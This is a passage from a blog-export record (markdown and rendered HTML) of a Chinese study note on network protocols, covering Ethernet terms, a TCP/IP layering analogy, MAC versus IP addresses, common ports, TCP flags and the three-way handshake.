帧类似于人类语言中的句子。在中文里，我们构造句子时会有一些规则，例如每个句子必须包含主语和谓语。以太网协议也规定了用于构造帧的一组规则。对于帧的最大和最小长度有明确规定，而且帧中必须包含一组必需的信息段。例如，每个帧必须包括目标地址和源地址，它们分别指出了消息的接收方和发送方。通过地址可标识唯一的节点，就像通过姓名可找出某个人一样。任何两个以太网设备都不应具有相同的地址。\n<!--more-->\n####TCP/IP协议原理图及解释\n\n[原理图链接](http://s3.sinaimg.cn/middle/52ddfea3t998861108572&690)\n\n**应用层（FTP协议）:**\n\n首先我们说说应用层，应用层就像在特定城市特定大厦特定房间内的某一个用户，应用层之间的通讯就像两个不同用户之间发送的信，这个信是点对点的，从一个用户（某一主机内特定应用程序）到另外一个特定用户（另一主机内特定应用程序）。一个主机（大厦）内可能有很多应用程序（客户），我们如何区分它们呢，实际生活中我们用房间号，在电脑内部区分不同应用程序我们用端口号。\n\n**传输层(TCP):**\n\n用户写好了信，需要给信套上信封，并且写好发件人所在大厦，和收件人所在大厦，实际生活中的大厦完全可以类比为我们的计算机和服务器。传输层（TCP）就是在两个不同主机之间传输信息的协议。\n\n**网络层(IP):**\n\n邮件准备好了，他首先会被送到本城市的快递公司，并且被打包，包裹上会写着源是重庆快递公司，目的是沈阳快递公司，但是重庆快递公司发现它不能直接发货到沈阳，需要通过北京快递公司进行中转。所以虽然目的是沈阳，但是他首先把这个包裹发给了北京。某个城市的快递公司就像IP协议，要抵达目的IP，需要查询路由表，如果发现目的地址不是直连就需要找下一跳。通过了解快递公司的工作，我们了解到IP协议是逐跳工作的。每一跳（路由器）根据目的IP地址查询下一跳，并且最终转发到目的地。\n\n**链路层（以太网）:**\n\n重庆快递公司已经知道他需要把包裹发给北京快递公司了，现在他就把包裹送到重庆火车站，搭上去往北京的火车，然后在北京火车站卸货。然后送到北京快递公司，北京快递公司再判断下一跳为沈阳快递公司，并且选择适当的传输方式，例如:汽车，最后通过这种传输方式送到目的地沈阳快递公司。链路层协议就像包裹的运输方式，我们可以选择以太网（火车），也可以选择令牌环（汽车）。并且链路层协议是逐介质的，从一个网卡（重庆火车站）到另外一个网卡（北京火车站）。\n所以你会发现一个数据包从源到目的，IP地址总是不变的（源是重庆快递公司，目的是沈阳快递公司），但是链路层协议却在不断变化，第一跳源是重庆火车站，目的是北京火车站，第二跳源是北京汽车站，目的是沈阳汽车站。\n\n- 知名端口号一般都低于1024，客户端端口号是临时的\n- TCP对数据进行封装，并对数据的安全进行保障，IP对被TCP封装后的数据进行传输\n- UDP对数据进行包装时不会对数据是否丢包进行保障，丢包时不返回检查，例如聊天信息的传输\n\n- 以太网的类型：0800  IP数据  （记）\n\n  ​\t\t\t\t\t\t 0806  ARP请求/应答   (记)\n\n  ​\t\t\t\t\t\t 8035  RARP请求/应答\n\n- 以太网的MTU最大值是1500，当数据大小大于出口的MTU时，会进行切片，并可进行多次切片处理\n\n## 关于IP首部\n\n[IP首部链接](https://blog.csdn.net/Wu000999/article/details/88617237)\n\n![img](https://img-blog.csdnimg.cn/20190317101238221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1d1MDAwOTk5,size_16,color_FFFFFF,t_70)\n\n- 详情点击上方链接（太难了。。。）\n\n## MAC 地址与 IP 地址区别\n\n- IP 地址和 MAC 地址相同点是它们都唯一，不同的特点主要有：\n\n1. 对于网络上的某一设备，如一台计算机或一台路由器，其 IP 地址是基于网络拓扑设计出的，同一台设备或计算机上，改动 IP 地址是很容易的（但必须唯一），而 MAC 则是生产厂商烧录好的，一般不能改动。我们可以根据需要给一台主机指定任意的 IP 地址，如我们可以给局域网上的某台计算机分配 IP 地址为 192.168.0.112 ，也可以将它改成 192.168.0.200。而任一网络设备（如网卡，路由器）一旦生产出来以后，其 MAC 地址不可由本地连接内的配置进行修改。如果一个计算机的网卡坏了，在更换网卡之后，该计算机的 MAC 地址就变了。\n2. 长度不同。IP 地址为 32 位，MAC 地址为 48 位。\n3. 分配依据不同。IP 地址的分配是基于网络拓扑，MAC 地址的分配是基于制造商。\n4. 寻址协议层不同。IP 地址应用于 OSI 第三层，即网络层，而 MAC 地址应用在 OSI 第二层，即数据链路层。 数据链路层协议可以使数据从一个节点传递到相同链路的另一个节点上（通过 MAC 地址），而网络层协议使数据可以从一个网络传递到另一个网络上（ARP 根据目的 IP 地址，找到中间节点的 MAC 地址，通过中间节点传送，从而最终到达目的网络）。\n5. **MAC地址其实是可以修改的，网上能搜到**\n\n\n\n### 数据传输时\n\n- IP视为标记，原IP和目的IP再数据传输的过程中是不变的\n- MAC视为步骤，每次经过网关时，IP和原MAC不变，但是目的MAC却会改变\n\n##### 基于TCP的应用层协议：\n\n- HTTP：80\n- HTTPS：443\n- FTP：20/21\n- SSH：22\n- TELNET：23\n- SMTP/POP：25/110\n\n\n\n### 通过tcp包中flags的值来判断tcp的状态\n\n\n在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.\n\n其中，对于我们日常的分析有用的就是前面的五个字段。\n它们的含义是：SYN表示建立连接，FIN表示关闭连接，ACK表示响应，PSH表示有 DATA数据传输，RST表示连接重置。\n\n其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，如果只是单个的一个SYN，它表示的只是建立连接。TCP的几次握手就是通过这样的ACK表现出来的。但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。\n\nPSH为1的情况，一般只出现在 DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。\nTCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。\n\nTCP三次握手：\nTCP(Transmission Control Protocol)传输控制协议\nTCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：\n\n位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)\n\n三次握手详解如下：\n一个虚拟连接的建立是通过三次握手来实现的\n\n(B) –> [SYN] –> (A)\n假如服务器A和客户机B通讯. 当A要和B通信时，B首先向A发一个SYN (Synchronize) 标记的包，告诉A请求建立连接.\n注意: 一个 SYN包就是仅SYN标记设为1的TCP包(参见TCP包头Resources). 认识到这点很重要，只有当A受到B发来的SYN包，才可建立连接，除此之外别无他法。因此，如果你的防火墙丢弃所有的发往外网接口的SYN包，那么你将不能让外部任何主机主动建立连接。\n(B) <– [SYN /ACK] <–(A)\n接着，A收到后会发一个对SYN包的确认包(SYN/ACK)回去，表示对第一个SYN包的确认，并继续握手操作.\n注意: SYN/ACK包是仅SYN 和 ACK 标记为1的包.\n(B) –> [ACK] –> (A)\nB收到SYN/ACK 包,B发一个确认包(ACK)，通知A连接已建立。至此，三次握手完成，一个TCP连接完成\nNote: ACK包就是仅ACK 标记设为1的TCP包. 需要注意的是当三此握手完成、连接建立以后，TCP连接的每个包都会设置ACK位\n握手阶段：\n序号 方向 seq ack\n\n1. A->B 10000 0\n2. B->A 20000 10000+1=10001\n3. A->B 10001 20000+1=20001\n   解释：\n   1：A向B发起连接请求，以一个随机数初始化A的seq,这里假设为10000，此时ACK＝0\n   2：B收到A的连接请求后，也以一个随机数初始化B的seq，这里假设为20000，意思是：你的请求我已收到，我这方的数据流就从这个数开始。B的ACK是A的seq加1，即10000＋1＝10001\n   3：A收到B的回复后，它的seq是它的上个请求的seq加1，即10000＋1＝10001，意思也是：你的回复我收到了，我这方的数据流就从这个数开始。A此时的ACK是B的seq加1，即20000+1=20001\n   数据传输阶段：\n   序号　　方向　　　　　　seq ack size\n   23 A->B 40000 70000 1514\n   24 B->A 70000 40000+1514-54=41460 54\n   25 A->B 41460 70000+54-54=70000 1514\n   26 B->A 70000 41460+1514-54=42920 54\n   解释：\n   23:B接收到A发来的seq=40000,ack=70000,size=1514的数据包\n   24:于是B向A也发一个数据包，告诉B，你的上个包我收到了。B的seq就以它收到的数据包的ACK填充，ACK是它收到的数据包的SEQ加上数据包的大小(不包括以太网协议头，IP头，TCP头)，以证实B发过来的数据全收到了。\n   25:A在收到B发过来的ack为41460的数据包时，一看到41460，正好是它的上个数据包的seq加上包的大小，就明白，上次发送的数据包已安全到达。于是它再发一个数据包给B。这个正在发送的数据包的seq也以它收到的数据包的ACK填充，ACK就以它收到的数据包的seq(70000)加上包的size(54)填充,即ack=70000+54-54(全是头长，没数据项)。\n   其实在握手和结束时确认号应该是对方序列号加1,传输数据时则是对方序列号加上对方携带应用层数据的长度.如果从以太网包返回来计算所加的长度,就嫌走弯路了.\n   另外,如果对方没有数据过来,则自处己的确认号不变,序列号为上次的序列号加上本次应用层数据发送长度.\n\n![img](https://iknow-pic.cdn.bcebos.com/b219ebc4b74543a99d881d8113178a82b80114ef?x-bce-process=image/resize,m_lfit,w_600,h_800,limit_1)\n\n\n\n[原文链接](https://blog.csdn.net/hushengqiang/article/details/44180557)\n\n\n\n### TCP/IP的四元组、五元组、七元组\n\n1. 四元组是：源IP地址、目的IP地址、源端口、目的端口\n\n2. 五元组是:   源IP地址、目的IP地址、协议号、源端口、目的端口\n\n3. 七元组是:    源IP地址、目的IP地址、协议号、源端口、目的端口，服务类型以及接口索引\n\n","source":"_posts/网络协议.md","raw":"---\ntitle: tcp/ip\ndate: 2020/5/3 9:08:28\ncomments: ture\ncategories:\n- 网络协议\ntags:\n- 网络协议\n---\n# 网络协议\n\n[相关博客](http://blog.sina.com.cn/s/blog_52ddfea30100nssx.html)\n\n## 以太网\n\n### 以太网术语\n\n以太网遵循一组控制其基本操作的简单规则。为了更好地理解这些规则，了解基本的以太网术语十分重要。 \n\n1. 介质——以太网设备连接到一个公共介质上，该介质为电气信号的传输提供了一条路径。历史上一直使用同轴铜电缆作为传输介质，但是目前双绞线或光纤更为多见。 \n2. 网段——我们将单个共享介质称作一个以太网段。 \n3. 节点——连接到网段的设备称作站点或节点。 \n4. 帧——节点使用称作帧的简短消息进行通信，帧是大小不固定的信息块。 帧类似于人类语言中的句子。在中文里，我们构造句子时会有一些规则，例如每个句子必须包含主语和谓语。以太网协议也规定了用于构造帧的一组规则。对于帧的最大和最小长度有明确规定，而且帧中必须包含一组必需的信息段。例如，每个帧必须包括目标地址和源地址，它们分别指出了消息的接收方和发送方。通过地址可标识唯一的节点，就像通过姓名可找出某个人一样。任何两个以太网设备都不应具有相同的地址。\n<!--more-->\n####TCP/IP协议原理图及解释\n\n[原理图链接](http://s3.sinaimg.cn/middle/52ddfea3t998861108572&690)\n\n**应用层（FTP协议）:**\n\n首先我们说说应用层，应用层就像在特定城市特定大厦特定房间内的某一个用户，应用层之间的通讯就像两个不同用户之间发送的信，这个信是点对点的，从一个用户（某一主机内特定应用程序）到另外一个特定用户（另一主机内特定应用程序）。一个主机（大厦）内可能有很多应用程序（客户），我们如何区分它们呢，实际生活中我们用房间号，在电脑内部区分不同应用程序我们用端口号。\n\n**传输层(TCP):**\n\n用户写好了信，需要给信套上信封，并且写好发件人所在大厦，和收件人所在大厦，实际生活中的大厦完全可以类比为我们的计算机和服务器。传输层（TCP）就是在两个不同主机之间传输信息的协议。\n\n**网络层(IP):**\n\n邮件准备好了，他首先会被送到本城市的快递公司，并且被打包，包裹上会写着源是重庆快递公司，目的是沈阳快递公司，但是重庆快递公司发现它不能直接发货到沈阳，需要通过北京快递公司进行中转。所以虽然目的是沈阳，但是他首先把这个包裹发给了北京。某个城市的快递公司就像IP协议，要抵达目的IP，需要查询路由表，如果发现目的地址不是直连就需要找下一跳。通过了解快递公司的工作，我们了解到IP协议是逐跳工作的。每一跳（路由器）根据目的IP地址查询下一跳，并且最终转发到目的地。\n\n**链路层（以太网）:**\n\n重庆快递公司已经知道他需要把包裹发给北京快递公司了，现在他就把包裹送到重庆火车站，搭上去往北京的火车，然后在北京火车站卸货。然后送到北京快递公司，北京快递公司再判断下一跳为沈阳快递公司，并且选择适当的传输方式，例如:汽车，最后通过这种传输方式送到目的地沈阳快递公司。链路层协议就像包裹的运输方式，我们可以选择以太网（火车），也可以选择令牌环（汽车）。并且链路层协议是逐介质的，从一个网卡（重庆火车站）到另外一个网卡（北京火车站）。\n所以你会发现一个数据包从源到目的，IP地址总是不变的（源是重庆快递公司，目的是沈阳快递公司），但是链路层协议却在不断变化，第一跳源是重庆火车站，目的是北京火车站，第二跳源是北京汽车站，目的是沈阳汽车站。\n\n- 知名端口号一般都低于1024，客户端端口号是临时的\n- TCP对数据进行封装，并对数据的安全进行保障，IP对被TCP封装后的数据进行传输\n- UDP对数据进行包装时不会对数据是否丢包进行保障，丢包时不返回检查，例如聊天信息的传输\n\n- 以太网的类型：0800  IP数据  （记）\n\n  ​\t\t\t\t\t\t 0806  ARP请求/应答   (记)\n\n  ​\t\t\t\t\t\t 8035  RARP请求/应答\n\n- 以太网的MTU最大值是1500，当数据大小大于出口的MTU时，会进行切片，并可进行多次切片处理\n\n## 关于IP首部\n\n[IP首部链接](https://blog.csdn.net/Wu000999/article/details/88617237)\n\n![img](https://img-blog.csdnimg.cn/20190317101238221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1d1MDAwOTk5,size_16,color_FFFFFF,t_70)\n\n- 详情点击上方链接（太难了。。。）\n\n## MAC 地址与 IP 地址区别\n\n- IP 地址和 MAC 地址相同点是它们都唯一，不同的特点主要有：\n\n1. 对于网络上的某一设备，如一台计算机或一台路由器，其 IP 地址是基于网络拓扑设计出的，同一台设备或计算机上，改动 IP 地址是很容易的（但必须唯一），而 MAC 则是生产厂商烧录好的，一般不能改动。我们可以根据需要给一台主机指定任意的 IP 地址，如我们可以给局域网上的某台计算机分配 IP 地址为 192.168.0.112 ，也可以将它改成 192.168.0.200。而任一网络设备（如网卡，路由器）一旦生产出来以后，其 MAC 地址不可由本地连接内的配置进行修改。如果一个计算机的网卡坏了，在更换网卡之后，该计算机的 MAC 地址就变了。\n2. 长度不同。IP 地址为 32 位，MAC 地址为 48 位。\n3. 分配依据不同。IP 地址的分配是基于网络拓扑，MAC 地址的分配是基于制造商。\n4. 寻址协议层不同。IP 地址应用于 OSI 第三层，即网络层，而 MAC 地址应用在 OSI 第二层，即数据链路层。 数据链路层协议可以使数据从一个节点传递到相同链路的另一个节点上（通过 MAC 地址），而网络层协议使数据可以从一个网络传递到另一个网络上（ARP 根据目的 IP 地址，找到中间节点的 MAC 地址，通过中间节点传送，从而最终到达目的网络）。\n5. **MAC地址其实是可以修改的，网上能搜到**\n\n\n\n### 数据传输时\n\n- IP视为标记，原IP和目的IP再数据传输的过程中是不变的\n- MAC视为步骤，每次经过网关时，IP和原MAC不变，但是目的MAC却会改变\n\n##### 基于TCP的应用层协议：\n\n- HTTP：80\n- HTTPS：443\n- FTP：20/21\n- SSH：22\n- TELNET：23\n- SMTP/POP：25/110\n\n\n\n### 通过tcp包中flags的值来判断tcp的状态\n\n\n在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.\n\n其中，对于我们日常的分析有用的就是前面的五个字段。\n它们的含义是：SYN表示建立连接，FIN表示关闭连接，ACK表示响应，PSH表示有 DATA数据传输，RST表示连接重置。\n\n其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，如果只是单个的一个SYN，它表示的只是建立连接。TCP的几次握手就是通过这样的ACK表现出来的。但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。\n\nPSH为1的情况，一般只出现在 DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。\nTCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。\n\nTCP三次握手：\nTCP(Transmission Control Protocol)传输控制协议\nTCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：\n\n位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)\n\n三次握手详解如下：\n一个虚拟连接的建立是通过三次握手来实现的\n\n(B) –> [SYN] –> (A)\n假如服务器A和客户机B通讯. 当A要和B通信时，B首先向A发一个SYN (Synchronize) 标记的包，告诉A请求建立连接.\n注意: 一个 SYN包就是仅SYN标记设为1的TCP包(参见TCP包头Resources). 认识到这点很重要，只有当A受到B发来的SYN包，才可建立连接，除此之外别无他法。因此，如果你的防火墙丢弃所有的发往外网接口的SYN包，那么你将不能让外部任何主机主动建立连接。\n(B) <– [SYN /ACK] <–(A)\n接着，A收到后会发一个对SYN包的确认包(SYN/ACK)回去，表示对第一个SYN包的确认，并继续握手操作.\n注意: SYN/ACK包是仅SYN 和 ACK 标记为1的包.\n(B) –> [ACK] –> (A)\nB收到SYN/ACK 包,B发一个确认包(ACK)，通知A连接已建立。至此，三次握手完成，一个TCP连接完成\nNote: ACK包就是仅ACK 标记设为1的TCP包. 需要注意的是当三此握手完成、连接建立以后，TCP连接的每个包都会设置ACK位\n握手阶段：\n序号 方向 seq ack\n\n1. A->B 10000 0\n2. B->A 20000 10000+1=10001\n3. A->B 10001 20000+1=20001\n   解释：\n   1：A向B发起连接请求，以一个随机数初始化A的seq,这里假设为10000，此时ACK＝0\n   2：B收到A的连接请求后，也以一个随机数初始化B的seq，这里假设为20000，意思是：你的请求我已收到，我这方的数据流就从这个数开始。B的ACK是A的seq加1，即10000＋1＝10001\n   3：A收到B的回复后，它的seq是它的上个请求的seq加1，即10000＋1＝10001，意思也是：你的回复我收到了，我这方的数据流就从这个数开始。A此时的ACK是B的seq加1，即20000+1=20001\n   数据传输阶段：\n   序号　　方向　　　　　　seq ack size\n   23 A->B 40000 70000 1514\n   24 B->A 70000 40000+1514-54=41460 54\n   25 A->B 41460 70000+54-54=70000 1514\n   26 B->A 70000 41460+1514-54=42920 54\n   解释：\n   23:B接收到A发来的seq=40000,ack=70000,size=1514的数据包\n   24:于是B向A也发一个数据包，告诉B，你的上个包我收到了。B的seq就以它收到的数据包的ACK填充，ACK是它收到的数据包的SEQ加上数据包的大小(不包括以太网协议头，IP头，TCP头)，以证实B发过来的数据全收到了。\n   25:A在收到B发过来的ack为41460的数据包时，一看到41460，正好是它的上个数据包的seq加上包的大小，就明白，上次发送的数据包已安全到达。于是它再发一个数据包给B。这个正在发送的数据包的seq也以它收到的数据包的ACK填充，ACK就以它收到的数据包的seq(70000)加上包的size(54)填充,即ack=70000+54-54(全是头长，没数据项)。\n   其实在握手和结束时确认号应该是对方序列号加1,传输数据时则是对方序列号加上对方携带应用层数据的长度.如果从以太网包返回来计算所加的长度,就嫌走弯路了.\n   另外,如果对方没有数据过来,则自处己的确认号不变,序列号为上次的序列号加上本次应用层数据发送长度.\n\n![img](https://iknow-pic.cdn.bcebos.com/b219ebc4b74543a99d881d8113178a82b80114ef?x-bce-process=image/resize,m_lfit,w_600,h_800,limit_1)\n\n\n\n[原文链接](https://blog.csdn.net/hushengqiang/article/details/44180557)\n\n\n\n### TCP/IP的四元组、五元组、七元组\n\n1. 四元组是：源IP地址、目的IP地址、源端口、目的端口\n\n2. 五元组是:   源IP地址、目的IP地址、协议号、源端口、目的端口\n\n3. 七元组是:    源IP地址、目的IP地址、协议号、源端口、目的端口，服务类型以及接口索引\n\n","slug":"网络协议","published":1,"updated":"2021-03-24T04:15:03.495Z","layout":"post","photos":[],"link":"","_id":"ckq3bl42r001adsvt3bxafbd9","content":"<h1 id=\"网络协议\"><a href=\"#网络协议\" class=\"headerlink\" title=\"网络协议\"></a>网络协议</h1><p><a href=\"http://blog.sina.com.cn/s/blog_52ddfea30100nssx.html\">相关博客</a></p>\n<h2 id=\"以太网\"><a href=\"#以太网\" class=\"headerlink\" title=\"以太网\"></a>以太网</h2><h3 id=\"以太网术语\"><a href=\"#以太网术语\" class=\"headerlink\" title=\"以太网术语\"></a>以太网术语</h3><p>以太网遵循一组控制其基本操作的简单规则。为了更好地理解这些规则，了解基本的以太网术语十分重要。 </p>\n<ol>\n<li>介质——以太网设备连接到一个公共介质上，该介质为电气信号的传输提供了一条路径。历史上一直使用同轴铜电缆作为传输介质，但是目前双绞线或光纤更为多见。 </li>\n<li>网段——我们将单个共享介质称作一个以太网段。 </li>\n<li>节点——连接到网段的设备称作站点或节点。 </li>\n<li>帧——节点使用称作帧的简短消息进行通信，帧是大小不固定的信息块。 帧类似于人类语言中的句子。在中文里，我们构造句子时会有一些规则，例如每个句子必须包含主语和谓语。以太网协议也规定了用于构造帧的一组规则。对于帧的最大和最小长度有明确规定，而且帧中必须包含一组必需的信息段。例如，每个帧必须包括目标地址和源地址，它们分别指出了消息的接收方和发送方。通过地址可标识唯一的节点，就像通过姓名可找出某个人一样。任何两个以太网设备都不应具有相同的地址。<span id=\"more\"></span>\n####TCP/IP协议原理图及解释</li>\n</ol>\n<p><a href=\"http://s3.sinaimg.cn/middle/52ddfea3t998861108572&690\">原理图链接</a></p>\n<p><strong>应用层（FTP协议）:</strong></p>\n<p>首先我们说说应用层，应用层就像在特定城市特定大厦特定房间内的某一个用户，应用层之间的通讯就像两个不同用户之间发送的信，这个信是点对点的，从一个用户（某一主机内特定应用程序）到另外一个特定用户（另一主机内特定应用程序）。一个主机（大厦）内可能有很多应用程序（客户），我们如何区分它们呢，实际生活中我们用房间号，在电脑内部区分不同应用程序我们用端口号。</p>\n<p><strong>传输层(TCP):</strong></p>\n<p>用户写好了信，需要给信套上信封，并且写好发件人所在大厦，和收件人所在大厦，实际生活中的大厦完全可以类比为我们的计算机和服务器。传输层（TCP）就是在两个不同主机之间传输信息的协议。</p>\n<p><strong>网络层(IP):</strong></p>\n<p>邮件准备好了，他首先会被送到本城市的快递公司，并且被打包，包裹上会写着源是重庆快递公司，目的是沈阳快递公司，但是重庆快递公司发现它不能直接发货到沈阳，需要通过北京快递公司进行中转。所以虽然目的是沈阳，但是他首先把这个包裹发给了北京。某个城市的快递公司就像IP协议，要抵达目的IP，需要查询路由表，如果发现目的地址不是直连就需要找下一跳。通过了解快递公司的工作，我们了解到IP协议是逐跳工作的。每一跳（路由器）根据目的IP地址查询下一跳，并且最终转发到目的地。</p>\n<p><strong>链路层（以太网）:</strong></p>\n<p>重庆快递公司已经知道他需要把包裹发给北京快递公司了，现在他就把包裹送到重庆火车站，搭上去往北京的火车，然后在北京火车站卸货。然后送到北京快递公司，北京快递公司再判断下一跳为沈阳快递公司，并且选择适当的传输方式，例如:汽车，最后通过这种传输方式送到目的地沈阳快递公司。链路层协议就像包裹的运输方式，我们可以选择以太网（火车），也可以选择令牌环（汽车）。并且链路层协议是逐介质的，从一个网卡（重庆火车站）到另外一个网卡（北京火车站）。<br>所以你会发现一个数据包从源到目的，IP地址总是不变的（源是重庆快递公司，目的是沈阳快递公司），但是链路层协议却在不断变化，第一跳源是重庆火车站，目的是北京火车站，第二跳源是北京汽车站，目的是沈阳汽车站。</p>\n<ul>\n<li><p>知名端口号一般都低于1024，客户端端口号是临时的</p>\n</li>\n<li><p>TCP对数据进行封装，并对数据的安全进行保障，IP对被TCP封装后的数据进行传输</p>\n</li>\n<li><p>UDP对数据进行包装时不会对数据是否丢包进行保障，丢包时不返回检查，例如聊天信息的传输</p>\n</li>\n<li><p>以太网的类型：0800  IP数据  （记）</p>\n<p>​                         0806  ARP请求/应答   (记)</p>\n<p>​                         8035  RARP请求/应答</p>\n</li>\n<li><p>以太网的MTU最大值是1500，当数据大小大于出口的MTU时，会进行切片，并可进行多次切片处理</p>\n</li>\n</ul>\n<h2 id=\"关于IP首部\"><a href=\"#关于IP首部\" class=\"headerlink\" title=\"关于IP首部\"></a>关于IP首部</h2><p><a href=\"https://blog.csdn.net/Wu000999/article/details/88617237\">IP首部链接</a></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://img-blog.csdnimg.cn/20190317101238221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1d1MDAwOTk5,size_16,color_FFFFFF,t_70\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"img\"></p>\n<ul>\n<li>详情点击上方链接（太难了。。。）</li>\n</ul>\n<h2 id=\"MAC-地址与-IP-地址区别\"><a href=\"#MAC-地址与-IP-地址区别\" class=\"headerlink\" title=\"MAC 地址与 IP 地址区别\"></a>MAC 地址与 IP 地址区别</h2><ul>\n<li>IP 地址和 MAC 地址相同点是它们都唯一，不同的特点主要有：</li>\n</ul>\n<ol>\n<li>对于网络上的某一设备，如一台计算机或一台路由器，其 IP 地址是基于网络拓扑设计出的，同一台设备或计算机上，改动 IP 地址是很容易的（但必须唯一），而 MAC 则是生产厂商烧录好的，一般不能改动。我们可以根据需要给一台主机指定任意的 IP 地址，如我们可以给局域网上的某台计算机分配 IP 地址为 192.168.0.112 ，也可以将它改成 192.168.0.200。而任一网络设备（如网卡，路由器）一旦生产出来以后，其 MAC 地址不可由本地连接内的配置进行修改。如果一个计算机的网卡坏了，在更换网卡之后，该计算机的 MAC 地址就变了。</li>\n<li>长度不同。IP 地址为 32 位，MAC 地址为 48 位。</li>\n<li>分配依据不同。IP 地址的分配是基于网络拓扑，MAC 地址的分配是基于制造商。</li>\n<li>寻址协议层不同。IP 地址应用于 OSI 第三层，即网络层，而 MAC 地址应用在 OSI 第二层，即数据链路层。 数据链路层协议可以使数据从一个节点传递到相同链路的另一个节点上（通过 MAC 地址），而网络层协议使数据可以从一个网络传递到另一个网络上（ARP 根据目的 IP 地址，找到中间节点的 MAC 地址，通过中间节点传送，从而最终到达目的网络）。</li>\n<li><strong>MAC地址其实是可以修改的，网上能搜到</strong></li>\n</ol>\n<h3 id=\"数据传输时\"><a href=\"#数据传输时\" class=\"headerlink\" title=\"数据传输时\"></a>数据传输时</h3><ul>\n<li>IP视为标记，原IP和目的IP再数据传输的过程中是不变的</li>\n<li>MAC视为步骤，每次经过网关时，IP和原MAC不变，但是目的MAC却会改变</li>\n</ul>\n<h5 id=\"基于TCP的应用层协议：\"><a href=\"#基于TCP的应用层协议：\" class=\"headerlink\" title=\"基于TCP的应用层协议：\"></a>基于TCP的应用层协议：</h5><ul>\n<li>HTTP：80</li>\n<li>HTTPS：443</li>\n<li>FTP：20/21</li>\n<li>SSH：22</li>\n<li>TELNET：23</li>\n<li>SMTP/POP：25/110</li>\n</ul>\n<h3 id=\"通过tcp包中flags的值来判断tcp的状态\"><a href=\"#通过tcp包中flags的值来判断tcp的状态\" class=\"headerlink\" title=\"通过tcp包中flags的值来判断tcp的状态\"></a>通过tcp包中flags的值来判断tcp的状态</h3><p>在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.</p>\n<p>其中，对于我们日常的分析有用的就是前面的五个字段。<br>它们的含义是：SYN表示建立连接，FIN表示关闭连接，ACK表示响应，PSH表示有 DATA数据传输，RST表示连接重置。</p>\n<p>其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，如果只是单个的一个SYN，它表示的只是建立连接。TCP的几次握手就是通过这样的ACK表现出来的。但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。</p>\n<p>PSH为1的情况，一般只出现在 DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。<br>TCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。</p>\n<p>TCP三次握手：<br>TCP(Transmission Control Protocol)传输控制协议<br>TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：</p>\n<p>位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)</p>\n<p>三次握手详解如下：<br>一个虚拟连接的建立是通过三次握手来实现的</p>\n<p>(B) –&gt; [SYN] –&gt; (A)<br>假如服务器A和客户机B通讯. 当A要和B通信时，B首先向A发一个SYN (Synchronize) 标记的包，告诉A请求建立连接.<br>注意: 一个 SYN包就是仅SYN标记设为1的TCP包(参见TCP包头Resources). 认识到这点很重要，只有当A受到B发来的SYN包，才可建立连接，除此之外别无他法。因此，如果你的防火墙丢弃所有的发往外网接口的SYN包，那么你将不能让外部任何主机主动建立连接。<br>(B) &lt;– [SYN /ACK] &lt;–(A)<br>接着，A收到后会发一个对SYN包的确认包(SYN/ACK)回去，表示对第一个SYN包的确认，并继续握手操作.<br>注意: SYN/ACK包是仅SYN 和 ACK 标记为1的包.<br>(B) –&gt; [ACK] –&gt; (A)<br>B收到SYN/ACK 包,B发一个确认包(ACK)，通知A连接已建立。至此，三次握手完成，一个TCP连接完成<br>Note: ACK包就是仅ACK 标记设为1的TCP包. 